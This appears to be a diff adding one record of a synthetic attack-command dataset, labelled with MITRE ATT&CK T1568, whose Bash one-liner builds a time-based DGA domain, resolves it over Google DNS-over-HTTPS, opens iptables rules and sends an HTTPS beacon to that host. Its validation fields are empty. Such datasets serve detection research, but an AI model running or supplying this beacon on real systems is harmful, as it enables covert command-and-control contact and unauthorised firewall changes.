@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'seed=$(date -u +%s | rev); d=\"cdn$(echo $seed | cut -c1-5).rotator.app\"; ip=$(curl -s \"https://dns.google/resolve?name=$d&type=A\" | tr , \"\\n\" | grep -m1 \"\\\"data\\\":\\\"[0-9.]*\\\"\" | cut -d\\\" -f4); if [ -n \"$ip\" ]; then port=$(shuf -i 20000-65000 -n 1); dev=$(ip -o -4 route show to default | awk \"{print $5}\" | head -n1); iptables -I OUTPUT -o \"$dev\" -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -i \"$dev\" -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --interface \"$dev\" \"https://$d:$port/hello\"; fi'",
+  "explanation": "Resolves a DGA domain via Google DoH, then limits traffic to the default interface and resolved IP:port using iptables before initiating an HTTPS beacon.",
+  "rationale_steps": [
+    "Generate a time-variant domain",
+    "Resolve via DoH (Google) and parse the IP",
+    "Identify the default network interface",
+    "Allow only that interface to the resolved IP:port with iptables",
+    "Send stealthy beacon over HTTPS on a high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-7f99e653",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
